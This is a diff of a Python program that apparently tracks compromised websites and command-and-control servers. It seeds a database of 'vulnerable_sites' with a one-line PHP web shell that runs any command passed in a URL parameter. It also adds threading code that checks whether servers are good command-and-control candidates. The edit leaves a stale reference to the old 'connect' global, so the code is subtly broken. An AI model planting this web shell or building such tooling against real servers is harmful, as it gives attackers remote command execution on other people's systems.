@@ -198,7 +198,7 @@ def initialize_database():
 	try:
 		cursor.execute("create table vulnerable_sites(url text,id integer, page text, method text, uploaded_shell text, attackurl text, language text)")
 		cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
-			[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
+			[("192.168.56.101"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
 		cursor.execute("create table open_ports(id integer, port_no integer, time text)")
 		conn.commit()
 
@@ -247,9 +247,10 @@ def run_candidate_threads(thread_count, timing, shell_id):
 		Runs and manages threads for checking whether or not a server would be a good
 		command and control candidate.
 	""" 
-	global connect
+	global connection_manager
 	listener_array = []#holds all of the current threads
 	temp_gen = 0
+
 	for i in range(thread_count):#create all the new network listeners
 		temp_gen = connect.new_get_port_number()
 		temp_listener = threading_network_listener(temp_gen)
@@ -319,9 +320,9 @@ def keyboardHandler(signal, frame):
 
 def initialize():
 	"""Handles the initialization for the entire program"""
-	pass
+	global connection_manager
+	connection_manager = connectionManager()
 	#global connect
-	#connect = connection.connection(1)#the 1 is for the id number of the shell to the connection object
 	#TODO I know this is going to come in handy but for the
 	#moment with only one connection object that is ever going to be 
 	#created then this will be used again.
